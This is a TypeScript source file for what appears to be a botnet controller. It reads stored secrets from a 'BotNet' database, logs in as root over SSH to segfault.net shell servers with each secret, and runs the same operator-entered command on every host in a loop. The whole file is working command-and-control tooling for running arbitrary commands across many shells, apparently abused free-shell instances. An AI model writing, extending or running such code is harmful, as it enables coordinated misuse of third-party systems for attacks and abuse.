import { Config } from "../../types/global.d.ts";
import { BotNetDataBase } from './../../database/index.ts';
import { NodeSSH as sshClient } from "npm:node-ssh"
const kv = new BotNetDataBase();

export class Operation {
    botnetList: NonNullable<Config>[] = [];

    constructor() {}

    public async setup() {
        await kv.setup();
        const symbolLists = await kv.kv?.list({
            prefix: ["secrets"],
        })

        if (!symbolLists) {
            console.log("\x1b[31m[!] No botnets found\x1b[0m");
            this.botnetList = [];
            return;
        }

        for await (const item of symbolLists) {
            this.botnetList.push(item.value as NonNullable<Config>);
        }

        console.log(`\x1b[32m[+]\x1b[0m Current have botnets: ${this.botnetList.length}`);
    }

    public async run() {
        const command = prompt("\x1b[32m[?] \x1b[0mCommand: ");

        if (!command) {
            console.log("\x1b[31m[!] Invalid input\x1b[0m\n");
            this.run();
            return;
        }

        for (const botnet of this.botnetList) {
            const ssh = new sshClient();
            console.log("\x1b[32m[+]\x1b[0m Connecting " + botnet.envSecret);
            // env
            const client = await ssh.connect({
                host: "8lgm.segfault.net",
                port: 22,
                username: "root",
                password: botnet.envSecret
            }).catch(() => {
                return ssh.connect({
                    host: "adm.segfault.net",
                    port: 22,
                    username: "root",
                    password: botnet.envSecret
                })
            })

            await client.execCommand(command, {
                onStderr: (_data) => {
                    console.log(`\x1b[33m[!]\x1b[0m ${botnet.envSecret} - Error ${_data.split("\n").shift()}...`);
                },
                onStdout: (_data) => {
                    console.log(`\x1b[32m[+]\x1b[0m ${botnet.envSecret} - Success ${_data.split("\n").shift()}...`);
                },
            })
        }

        this.run();
    }
}